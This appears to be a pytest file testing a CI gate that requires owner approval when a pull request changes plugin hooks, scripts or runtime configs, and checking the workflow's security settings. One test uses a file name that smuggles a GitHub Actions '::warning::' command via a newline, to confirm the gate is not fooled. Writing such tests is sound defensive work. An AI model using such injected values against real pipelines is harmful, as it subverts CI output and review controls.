def test_a_script_under_a_directory_with_no_skill_md_gates():
    assert_gated(run(base_p(), dict(base_p(), **{PR + "/skills/other/scripts/a.py": b"x\n"})),
                 "plugin-path")


def test_a_script_a_hook_names_still_gates_under_a_skill_without_a_shell():
    base = base_p(**{PR + "/hooks/hooks.json": hook_config('"${CLAUDE_PLUGIN_ROOT}"/skills/s/scripts/a.py'),
                     PR + "/skills/s/scripts/a.py": b"1\n"})
    assert_gated(run(base, dict(base, **{PR + "/skills/s/scripts/a.py": b"2\n"})), "hook-referenced")


# Round 2 of the #164 review: exemption (b) fails open when anything other than
# the skill's own frontmatter can run the script. Each case edits only the script.

SCRIPT = PR + "/skills/s/scripts/f"
CALL = "${CLAUDE_PLUGIN_ROOT}/skills/s/scripts/f"


def edit_only_the_script(extra_base, extra_head=None):
    base = base_p(**{SCRIPT: b"1\n"}, **extra_base)
    head = dict(base if extra_head is None else base_p(**{SCRIPT: b"1\n"}, **extra_head))
    head[SCRIPT] = b"2\n"
    return run(base, head)


def test_f1_a_hook_config_a_manifest_names_inside_the_skill_gates():
    cfg = PR + "/skills/s/scripts/hooks.json"
    man = {"name": "p", "hooks": "./skills/s/scripts/hooks.json"}
    base = base_p(**{PR + "/.claude-plugin/plugin.json": man, cfg: HOOKS_OK})
    assert run(base, dict(base, **{cfg: HOOKS_BAD}))[0]


@pytest.mark.parametrize("name, files", [
    ("mcp", {PR + "/.mcp.json": {"mcpServers": {"x": {"command": "node", "args": [CALL]}}}}),
    ("manifest-mcp", {PR + "/.claude-plugin/plugin.json":
                      {"name": "p", "mcpServers": {"x": {"command": "node", "args": [CALL]}}}}),
    ("lsp", {PR + "/.lsp.json": {"lspServers": {"x": {"command": CALL}}}}),
    ("monitors", {PR + "/monitors/monitors.json": [{"command": CALL}]}),
])
def test_f2_a_config_that_names_the_script_gates(name, files):
    assert edit_only_the_script(files)[0]


def test_f2_a_marketplace_entry_that_names_the_script_gates():
    entry = dict(ENTRY, mcpServers={"x": {"command": CALL}})
    base = {MP: mk(entry), PR + "/skills/s/SKILL.md": skill_md(), SCRIPT: b"1\n"}
    assert run(base, dict(base, **{SCRIPT: b"2\n"}))[0]


@pytest.mark.parametrize("name, files", [
    ("other-skill", {PR + "/skills/o/SKILL.md": skill_md("hooks:\n  Stop:\n    - command: " + CALL + "\n")}),
    ("agent", {PR + "/agents/a.md": skill_md("hooks:\n  Stop:\n    - command: " + CALL + "\n")}),
    ("command-file", {PR + "/commands/c.md": skill_md(body="!`" + CALL + "`\n")}),
])
def test_f3_a_frontmatter_hook_or_load_time_command_that_names_the_script_gates(name, files):
    assert edit_only_the_script(files)[0]


def test_f3_a_load_time_command_in_the_skills_own_skill_md_gates():
    own = {PR + "/skills/s/SKILL.md": skill_md(body="!`echo hi`\n")}
    assert edit_only_the_script(own)[0]


def test_f4_an_unchanged_hook_script_that_execs_the_script_gates():
    files = {PR + "/hooks/run.sh": b"#!/bin/sh\nexec ../skills/s/scripts/f\n"}
    assert_gated(edit_only_the_script(files), "plugin-path")


def test_a_mention_of_another_skill_does_not_stop_the_exemption():
    files = {PR + "/.mcp.json": {"mcpServers": {"x": {"args": ["${CLAUDE_PLUGIN_ROOT}/skills/other/f"]}}}}
    assert_not_gated(edit_only_the_script(files))


def test_a_mention_in_markdown_prose_stops_the_exemption():
    files = {PR + "/docs/notes.md": skill_md(body="see skills/s/scripts/f\n")}
    assert edit_only_the_script(files)[0]


@pytest.mark.parametrize("out, ok", [
    ('{"truncated": false, "paths": ["a/b"]}', True),
    ('{"truncated": true, "paths": ["a/b"]}', False),
    ("not json", False),
])
def test_the_tree_listing_fails_closed_when_truncated_or_unreadable(monkeypatch, out, ok):
    done = subprocess.CompletedProcess([], 0, stdout=out.encode(), stderr=b"")
    monkeypatch.setattr(gate.subprocess, "run", lambda *a, **k: done)
    fetcher = gate.GhFetcher("owner/repo", 1)
    if ok:
        assert fetcher.list_files(BASE) == ["a/b"]
    else:
        with pytest.raises((gate.GateError, ValueError)):
            fetcher.list_files(BASE)


# Round 3 of the #164 review.


def test_r3_a_sibling_skill_that_grants_a_shell_stops_the_exemption():
    files = {PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n", "run skills/s/scripts/f\n")}
    assert edit_only_the_script(files)[0]
    files = {PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n", "unrelated\n")}
    assert edit_only_the_script(files)[0]


def test_r3_a_shell_grant_removed_at_head_still_counts_from_base():
    base = base_p(**{SCRIPT: b"1\n", PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n")})
    head = dict(base, **{SCRIPT: b"2\n", PR + "/skills/t/SKILL.md": skill_md()})
    assert run(base, head)[0]


@pytest.mark.parametrize("path", [PR + "/workflows/w.js", PR + "/monitors/m.sh", PR + "/lib/x.mjs",
                                  PR + "/config.yaml", PR + "/skills/o/references/r.txt"])
def test_r3_every_text_file_under_the_root_is_scanned(path):
    assert edit_only_the_script({path: b"node ${CLAUDE_PLUGIN_ROOT}/skills/s/scripts/f\n"})[0]


@pytest.mark.parametrize("text", [
    '{"command": "${CLAUDE_PLUGIN_ROOT}\\/skills\\/s\\/scripts\\/f"}',
    '{"command": "${CLAUDE_PLUGIN_ROOT}/\\u0073kills/s/scripts/f"}',
    "%PLUGIN_ROOT%\\skills\\S\\scripts\\f",
    "$ROOT/skills//s///scripts/f",
    "$ROOT/skills/./s/scripts/f",
    "${CLAUDE_SKILL_DIR}/../s/scripts/f",
    "cd skills/s && ./scripts/f",
])
def test_r3_a_mention_is_found_through_escapes_case_and_separators(text):
    assert edit_only_the_script({PR + "/lib/x.js": text.encode()})[0]


@pytest.mark.parametrize("text", ["skills/s2/scripts/f", "skills/ss/", "$ROOT/class/x", "skills/other/s2"])
def test_r3_a_longer_component_is_not_a_mention(text):
    assert_not_gated(edit_only_the_script({PR + "/lib/x.js": text.encode()}))


def test_r3_a_file_that_is_not_utf8_blocks_the_exemption():
    assert edit_only_the_script({PR + "/lib/blob.bin": b"\xff\x00 skills/s/scripts"})[0]


def test_r3_the_candidates_own_scripts_and_tests_are_not_scanned():
    files = {PR + "/skills/s/tests/t.py": b"run skills/s/scripts/f\n",
             PR + "/skills/s/scripts/g": b"skills/s/scripts/f\n"}
    assert_not_gated(edit_only_the_script(files))


def test_r3_a_skill_retired_whole_does_not_gate_whatever_its_grant():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n"),
                     PR + "/skills/t/scripts/x.sh": b"1\n", PR + "/skills/t/references/r.md": b"r\n"})
    head = {k: v for k, v in base.items() if "/skills/t/" not in k}
    assert_not_gated(run(base, head))


def test_r3_a_partial_removal_from_a_shell_skill_gates():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n"),
                     PR + "/skills/t/scripts/x.sh": b"1\n"})
    head = {k: v for k, v in base.items() if not k.endswith("x.sh")}
    assert run(base, head)[0]


def test_r3_other_changes_in_a_retiring_pull_request_are_still_judged():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n")})
    head = {k: v for k, v in base.items() if "/skills/t/" not in k}
    head[PR + "/lib/x.js"] = b"x\n"
    assert_gated(run(base, head), "plugin-path")


def test_r3_a_file_added_into_a_retiring_skill_means_it_is_not_retired():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md("allowed-tools: Bash\n")})
    head = {k: v for k, v in base.items() if "/skills/t/" not in k}
    head[PR + "/skills/t/lib.py"] = b"x\n"
    assert run(base, head)[0]


def test_r3_an_eval_improve_skill_md_prose_edit_does_not_gate():
    base = base_p()
    assert_not_gated(run(base, dict(base, **{PR + "/skills/s/SKILL.md": skill_md(body="better words\n")})))


class _Runs:
    """A scripted subprocess.run: each call pops the next outcome."""

    def __init__(self, *outcomes):
        self.outcomes, self.calls, self.timeouts = list(outcomes), 0, []

    def __call__(self, args, **kwargs):
        self.calls += 1
        self.timeouts.append(kwargs.get("timeout"))
        outcome = self.outcomes.pop(0)
        if outcome == "timeout":
            raise subprocess.TimeoutExpired(args, kwargs.get("timeout"))
        code, out, err = outcome
        return subprocess.CompletedProcess(args, code, stdout=out, stderr=err)


@pytest.fixture
def no_backoff(monkeypatch):
    waits = []
    monkeypatch.setattr(gate, "_sleep", waits.append)
    return waits


def test_r3_a_transient_failure_is_retried_and_then_succeeds(monkeypatch, no_backoff):
    runs = _Runs((1, b"", b"HTTP 502"), "timeout", (0, b'{"a": 1}', b""))
    monkeypatch.setattr(gate.subprocess, "run", runs)
    assert gate.GhFetcher("o/r", 1).changed_files() == [{"a": 1}]
    assert runs.calls == 3 and len(no_backoff) == 2 and set(runs.timeouts) == {60}


def test_r3_three_failures_fail_closed(monkeypatch, no_backoff):
    runs = _Runs((1, b"", b"x"), (1, b"", b"x"), (1, b"", b"x"))
    monkeypatch.setattr(gate.subprocess, "run", runs)
    with pytest.raises(gate.GateError):
        gate.GhFetcher("o/r", 1).changed_files()
    assert runs.calls == 3


def test_r3_a_404_on_a_read_is_an_answer_and_is_not_retried(monkeypatch, no_backoff):
    runs = _Runs((1, b"", b"gh: Not Found (HTTP 404)"))
    monkeypatch.setattr(gate.subprocess, "run", runs)
    assert gate.GhFetcher("o/r", 1).read("a/b", BASE) is None
    assert runs.calls == 1


# Round 4 of the #164 review.


def test_r4_utf16_text_with_a_bom_is_decoded_and_scanned():
    mention = "run skills/s/scripts/f".encode("utf-16")
    clean = "nothing here".encode("utf-16")
    assert edit_only_the_script({PR + "/lib/u.txt": mention})[0]
    assert_not_gated(edit_only_the_script({PR + "/lib/u.txt": clean}))


@pytest.mark.parametrize("name", ["a.png", "a.jpg", "a.jpeg", "a.gif", "a.webp", "a.ico"])
def test_r4_a_raster_image_is_not_scanned_and_does_not_block(name):
    assert_not_gated(edit_only_the_script({PR + "/lib/" + name: b"\x89\xff\x00\xfe"}))


def test_r4_an_undecodable_file_in_the_candidates_own_tests_does_not_block():
    assert_not_gated(edit_only_the_script({PR + "/skills/s/tests/fixture.bin": b"\xff\x00"}))


def test_r4_an_svg_is_scanned_as_text():
    svg = b'<svg><a href="skills/s/scripts/f"/></svg>'
    assert edit_only_the_script({PR + "/lib/a.svg": svg})[0]


@pytest.mark.parametrize("path, content", [
    (PR + "/commands/c.md", skill_md("allowed-tools: Bash\n")),
    (PR + "/agents/a.md", skill_md("tools: Read, Bash\n")),
    (PR + "/docs/d.md", skill_md("allowed-tools: PowerShell\n")),
])
def test_r4_a_shell_grant_in_any_markdown_frontmatter_blocks_the_exemption(path, content):
    assert edit_only_the_script({path: content})[0]


def test_r4_a_hook_config_a_manifest_names_inside_a_retired_skill_still_gates():
    man = {"name": "p", "hooks": "./skills/one/guard.json"}
    base = base_p(**{PR + "/.claude-plugin/plugin.json": man, PR + "/skills/one/SKILL.md": skill_md(),
                     PR + "/skills/one/guard.json": HOOKS_OK})
    head = {k: v for k, v in base.items() if "/skills/one/" not in k}
    assert run(base, head)[0]


def test_r4_a_removed_file_the_head_tree_still_holds_fails_closed():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md(), PR + "/skills/t/x": b"1\n"})
    head = {k: v for k, v in base.items() if not k.endswith("/skills/t/SKILL.md")}
    files = [{"filename": PR + "/skills/t/SKILL.md", "status": "removed", "previous_filename": None},
             {"filename": PR + "/skills/t/x", "status": "removed", "previous_filename": None}]
    assert_gated(run(base, head, files=files), "fail-closed")


def test_r4_a_changed_path_that_is_not_removed_in_an_empty_head_directory_fails_closed():
    base = base_p(**{PR + "/skills/t/SKILL.md": skill_md()})
    head = {k: v for k, v in base.items() if "/skills/t/" not in k}
    files = [{"filename": PR + "/skills/t/SKILL.md", "status": "removed", "previous_filename": None},
             {"filename": PR + "/skills/t/new.py", "status": "removed", "previous_filename": None},
             {"filename": PR + "/skills/t/mod.py", "status": "modified", "previous_filename": None}]
    assert_gated(run(base, head, files=files), "fail-closed")


def test_r4_a_404_on_a_listed_file_fails_closed():
    class Ghost(FakeFetcher):
        def list_files(self, sha):
            return super().list_files(sha) + [PR + "/lib/ghost.js"]

    base = base_p(**{SCRIPT: b"1\n"})
    head = dict(base, **{SCRIPT: b"2\n"})
    assert_gated(gate.decide(Ghost(base, head), BASE, HEAD), "fail-closed")


# Round 5 of the #164 review.


def test_r5_utf32_text_with_a_bom_is_decoded_and_scanned():
    assert edit_only_the_script({PR + "/lib/u.txt": "run skills/s/scripts/f".encode("utf-32")})[0]
    assert_not_gated(edit_only_the_script({PR + "/lib/u.txt": "nothing".encode("utf-32")}))


@pytest.mark.parametrize("data", ["run skills/s/scripts/f".encode("utf-16-le"),
                                  b"run skills/s/scripts/f\x00 more", b"\x00\x00\xfe\xff\xd8\x00\x00"])
def test_r5_text_holding_a_nul_is_undecodable_and_blocks(data):
    assert edit_only_the_script({PR + "/lib/u.txt": data})[0]


def test_r5_a_raster_named_file_that_is_text_is_scanned():
    assert edit_only_the_script({PR + "/lib/a.png": b"run skills/s/scripts/f"})[0]
    assert_not_gated(edit_only_the_script({PR + "/lib/a.png": b"plain text, no mention"}))


def test_r5_a_404_on_a_hook_config_the_tree_lists_fails_closed():
    class Ghost(FakeFetcher):
        def list_files(self, sha):
            return super().list_files(sha) + [PR + "/config/hooks.json"]

    man = {"name": "p", "hooks": "./config/hooks.json"}
    base = base_p(**{PR + "/.claude-plugin/plugin.json": man, PR + "/README.md": b"a\n"})
    head = dict(base, **{PR + "/README.md": b"b\n"})
    assert_gated(gate.decide(Ghost(base, head), BASE, HEAD), "fail-closed")
    assert_not_gated(run(base, head))


def retire(extra):
    base = base_p(**{PR + "/skills/old/SKILL.md": skill_md(), PR + "/skills/old/scripts/srv.js": b"1\n"},
                  **extra)
    head = {k: v for k, v in base.items() if "/skills/old/" not in k}
    return run(base, head)


def test_r5_a_retired_skill_still_named_by_a_config_gates():
    assert retire({PR + "/.mcp.json": {"mcpServers": {"x": {"args": ["skills/old/scripts/srv.js"]}}}})[0]


def test_r5_a_retired_skill_whose_data_a_hook_script_reads_gates():
    assert retire({PR + "/hooks/run.sh": b"cat ../skills/old/deny.txt\n"})[0]


def test_r5_a_retired_skill_named_only_inside_itself_does_not_gate():
    own = {PR + "/skills/old/references/r.md": b"see skills/old/scripts/srv.js\n"}
    assert_not_gated(retire(own))


# =================================================================================
# main(): output and exit status
# =================================================================================


ARGS = ["--repo", "owner/repo", "--pr", "7", "--base", BASE, "--head", HEAD]


def test_main_writes_the_verdict_and_exits_zero(tmp_path, monkeypatch, capsys):
    out = tmp_path / "out"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out))
    base = tree()
    head = dict(base, **{"plugins/alpha/hooks/\n::warning::x": b"x"})
    assert gate.main(ARGS, fetcher=FakeFetcher(base, head)) == 0
    assert out.read_text() == "gated=true\n"
    printed = capsys.readouterr().out
    assert printed.startswith("gated=true\n")
    assert not any(line.startswith("::") for line in printed.splitlines()), printed


def test_main_reports_false_when_nothing_gates(tmp_path, monkeypatch, capsys):
    out = tmp_path / "out"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out))
    assert gate.main(ARGS, fetcher=FakeFetcher(tree(), tree())) == 0
    assert out.read_text() == "gated=false\n"
    assert capsys.readouterr().out == "gated=false\n"


def test_main_never_prints_file_contents(monkeypatch, capsys):
    monkeypatch.delenv("GITHUB_OUTPUT", raising=False)
    base = tree()
    head = dict(base, **{"plugins/alpha/settings.json": b'{"agent": "zorblax-content"}'})
    gate.main(ARGS, fetcher=FakeFetcher(base, head))
    assert "zorblax-content" not in capsys.readouterr().out


@pytest.mark.parametrize("bad", [
    ["--repo", "not a repo"], ["--pr", "x"], ["--pr", "0"], ["--base", "abc"], ["--head", "B" * 40],
])
def test_a_usage_error_exits_nonzero(bad, monkeypatch):
    for name in ("REPO", "PR_NUMBER", "BASE_SHA", "HEAD_SHA"):
        monkeypatch.delenv(name, raising=False)
    args = list(ARGS)
    flag = args.index(bad[0])
    args[flag + 1] = bad[1]
    with pytest.raises(SystemExit) as exc:
        gate.main(args, fetcher=FakeFetcher(tree(), tree()))
    assert exc.value.code == 2


def test_arguments_default_to_the_environment(monkeypatch):
    monkeypatch.setenv("REPO", "owner/repo")
    monkeypatch.setenv("PR_NUMBER", "12")
    monkeypatch.setenv("BASE_SHA", BASE)
    monkeypatch.setenv("HEAD_SHA", HEAD)
    args = gate._parse_args([])
    assert (args.repo, args.pr, args.base, args.head) == ("owner/repo", 12, BASE, HEAD)


def test_gh_output_is_read_as_a_stream_of_json_values():
    text = '{"filename": "a", "status": "added"}\n{\n  "filename": "b"\n}\n'
    assert gate._json_values(text) == [{"filename": "a", "status": "added"}, {"filename": "b"}]


# =================================================================================
# The workflow's shape — parsed, never grepped
# =================================================================================


def load_workflow() -> dict:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def triggers(doc: dict) -> dict:
    # pyyaml (YAML 1.1) reads a bare `on` as the boolean True.
    return doc[True] if True in doc else doc["on"]


def test_the_only_trigger_is_pull_request_target_with_exactly_these_types():
    assert triggers(load_workflow()) == {
        "pull_request_target": {"types": ["opened", "synchronize", "reopened"]}}


def _walk(node):
    yield node
    if isinstance(node, dict):
        for value in node.values():
            yield from _walk(value)
    elif isinstance(node, list):
        for value in node:
            yield from _walk(value)


def test_there_is_no_concurrency_anywhere():
    assert not any(isinstance(n, dict) and "concurrency" in n for n in _walk(load_workflow()))


def test_the_permissions_are_read_only():
    doc = load_workflow()
    assert doc["permissions"] == {"contents": "read", "pull-requests": "read", "actions": "read"}
    assert all("permissions" not in job for job in doc["jobs"].values())


def test_every_checkout_is_the_base_without_credentials():
    steps = [s for job in load_workflow()["jobs"].values() for s in job["steps"]
             if str(s.get("uses", "")).startswith("actions/checkout@")]
    assert steps, "the detect job must check out the base to run the gate script"
    for step in steps:
        with_ = step.get("with") or {}
        assert "ref" not in with_ and "repository" not in with_, step
        assert with_.get("persist-credentials") is False, step


def test_every_action_is_locked_to_a_full_sha():
    # Steps name a release tag; .github/workflows/actions.lock pins each one to
    # the commit the runner actually runs (ADR 0024 in _agent-guidance).
    lock = yaml.safe_load((WORKFLOW.parent / "actions.lock").read_text(encoding="utf-8"))
    listed = lock["workflows"][f".github/workflows/{WORKFLOW.name}"]
    checked = 0
    for job in load_workflow()["jobs"].values():
        for step in job["steps"]:
            uses = step.get("uses")
            if uses is None or uses.startswith(("./", "$/", "docker://",
                                                "Adam-S-Daniel/cms-platform/")):
                continue
            # gh actions-lock writes owner/repo in lowercase; the ref stays exact.
            repo, ref = uses.rsplit("@", 1)
            key = f"{repo.lower()}@{ref}"
            entry = lock["dependencies"].get(key)
            assert entry is not None, f"{uses} has no actions.lock entry"
            assert re.fullmatch(r"sha1-[0-9a-f]{40}", entry["commit"]), (uses, entry)
            assert entry["ref"] == ref, (uses, entry)
            assert key in listed, f"{uses} is not listed for {WORKFLOW.name} in actions.lock"
            checked += 1
    assert checked, "expected at least one third-party action to check"


def test_the_approval_job_selects_the_environment_failing_closed():
    job = load_workflow()["jobs"]["plugin-runtime-approval"]
    assert job["environment"] == (
        "${{ needs.detect.outputs.gated != 'false' && 'plugin-runtime-review' || '' }}")
    assert job["needs"] == "detect"
    assert job["if"] == "always()"


def test_the_approval_job_publishes_its_context_under_its_job_id():
    job = load_workflow()["jobs"]["plugin-runtime-approval"]
    assert "name" not in job
    assert "matrix" not in (job.get("strategy") or {})


def test_no_job_has_a_timeout():
    # Fleet rule (repo-settings fleet.yml): a required check carries no
    # timeout-minutes, so GitHub can never report it cancelled by a time limit.
    doc = load_workflow()
    assert "timeout-minutes" not in doc
    assert doc["jobs"]
    for job_id, job in doc["jobs"].items():
        assert "timeout-minutes" not in job, job_id
        for step in job["steps"]:
            assert "timeout-minutes" not in step, (job_id, step)


def test_no_run_block_interpolates_an_expression():
    runs = [s["run"] for job in load_workflow()["jobs"].values() for s in job["steps"] if "run" in s]
    assert runs
    for body in runs:
        assert "${{" not in body, body


def test_detect_runs_the_gate_script_with_the_event_context_in_env():
    steps = load_workflow()["jobs"]["detect"]["steps"]
    gate_step = [s for s in steps if s.get("id") == "gate"]
    assert len(gate_step) == 1
    step = gate_step[0]
    assert step["run"].strip() == "python3 scripts/plugin_runtime_gate.py"
    assert set(step["env"]) >= {"REPO", "PR_NUMBER", "BASE_SHA", "HEAD_SHA", "GH_TOKEN"}
    assert load_workflow()["jobs"]["detect"]["outputs"]["gated"] == "${{ steps.gate.outputs.gated }}"


def _verify_step():
    steps = load_workflow()["jobs"]["plugin-runtime-approval"]["steps"]
    found = [s for s in steps if "gh api" in s.get("run", "")]
    assert len(found) == 1
    return found[0]


def test_the_environment_protection_is_checked_only_when_gated():
    assert _verify_step()["if"] == "needs.detect.outputs.gated != 'false'"


def _run_verify(tmp_path, gh_stdout, gh_exit, owner_id="1001"):
    """Run the verify step's body with a fake `gh` on PATH."""
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("no bash on PATH")
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    fake = bin_dir / "gh"
    fake.write_text("#!/bin/sh\nprintf '%s' \"$FAKE_GH_OUT\"\nexit \"$FAKE_GH_EXIT\"\n",
                    encoding="utf-8")
    fake.chmod(0o755)
    env = dict(os.environ, PATH=f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}",
               REPO="owner/repo", OWNER_ID=owner_id,
               FAKE_GH_OUT=gh_stdout, FAKE_GH_EXIT=str(gh_exit))
    return subprocess.run([bash, "-c", _verify_step()["run"]], env=env,
                          capture_output=True, text=True, check=False)


# Invented ids: the step compares reviewers to the event's repository_owner_id.
_OWNER_RULE = json.dumps({"protection_rules": [{"type": "required_reviewers", "reviewers": [
    {"type": "User", "reviewer": {"id": 1001}}]}]})


@pytest.mark.skipif(sys.platform == "win32", reason="the fake gh is a POSIX shell script")
@pytest.mark.parametrize("stdout, code, ok", [
    (_OWNER_RULE, 0, True),
    (_OWNER_RULE.replace("1001", "2002"), 0, False),
    (_OWNER_RULE.replace('"User"', '"Team"'), 0, False),
    (json.dumps({"protection_rules": [{"type": "wait_timer", "wait_timer": 5}]}), 0, False),
    (json.dumps({"protection_rules": []}), 0, False),
    ("", 0, False),
    ('{"message":"Not Found"}', 1, False),
    (_OWNER_RULE, 1, False),
])
def test_the_protection_check_passes_only_on_an_owner_rule(tmp_path, stdout, code, ok):
    result = _run_verify(tmp_path, stdout, code)
    assert (result.returncode == 0) is ok, (result.stdout, result.stderr)


@pytest.mark.skipif(sys.platform == "win32", reason="the fake gh is a POSIX shell script")
@pytest.mark.parametrize("owner_id", ["", "abc", "0"])
def test_the_protection_check_refuses_a_missing_owner_id(tmp_path, owner_id):
    result = _run_verify(tmp_path, _OWNER_RULE, 0, owner_id=owner_id)
    assert result.returncode != 0, (result.stdout, result.stderr)


# A required check matches by context NAME, not by workflow. A job called
# plugin-runtime-approval anywhere else would publish a passing context on a
# pull request's head without the owner's approval.

APPROVAL_CONTEXT = "plugin-runtime-approval"


def _impersonating_jobs(workflows_dir: Path):
    found = []
    for path in sorted(workflows_dir.glob("*.yml")) + sorted(workflows_dir.glob("*.yaml")):
        if path.name == WORKFLOW.name:
            continue
        doc = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        for job_id, job in (doc.get("jobs") or {}).items():
            name = job.get("name") if isinstance(job, dict) else None
            if APPROVAL_CONTEXT in (job_id, name):
                found.append(f"{path.name}:{job_id}")
    return found


def test_no_other_workflow_publishes_the_approval_context():
    workflows = REPO_ROOT / ".github" / "workflows"
    assert (workflows / "ci.yml").is_file(), "the scan must see the real workflows"
    assert _impersonating_jobs(workflows) == []


@pytest.mark.parametrize("job", [
    {APPROVAL_CONTEXT: {"runs-on": "ubuntu-latest", "steps": [{"run": "true"}]}},
    {"other": {"name": APPROVAL_CONTEXT, "runs-on": "ubuntu-latest", "steps": [{"run": "true"}]}},
])
def test_a_job_impersonating_the_approval_context_is_found(tmp_path, job):
    (tmp_path / WORKFLOW.name).write_text(WORKFLOW.read_text(encoding="utf-8"), encoding="utf-8")
    (tmp_path / "ci.yml").write_text(
        yaml.safe_dump({"on": {"pull_request": None}, "jobs": job}), encoding="utf-8")
    assert len(_impersonating_jobs(tmp_path)) == 1


def test_the_detect_job_sets_up_python_before_installing_and_running_the_gate():
    steps = load_workflow()["jobs"]["detect"]["steps"]
    uses = [str(st.get("uses", "")).split("@")[0] for st in steps]
    setup = uses.index("actions/setup-python")
    install = next(i for i, st in enumerate(steps) if "pip install" in st.get("run", ""))
    gate_at = next(i for i, st in enumerate(steps) if "plugin_runtime_gate.py" in st.get("run", ""))
    assert setup < install < gate_at


def test_the_detect_job_installs_pyyaml_from_the_base_requirements_before_the_gate():
    steps = load_workflow()["jobs"]["detect"]["steps"]
    gate_at = next(i for i, st in enumerate(steps) if "plugin_runtime_gate.py" in st.get("run", ""))
    installs = [i for i, st in enumerate(steps) if "pip install" in st.get("run", "")]
    assert installs and installs[0] < gate_at
    run_text = steps[installs[0]]["run"]
    assert "-r requirements-dev.txt" in run_text
    # The file is the base checkout's (no head ref) and pins PyYAML exactly.
    pins = (REPO_ROOT / "requirements-dev.txt").read_text(encoding="utf-8").lower()
    assert re.search(r"^pyyaml==\d+(\.\d+)*$", pins, re.M)
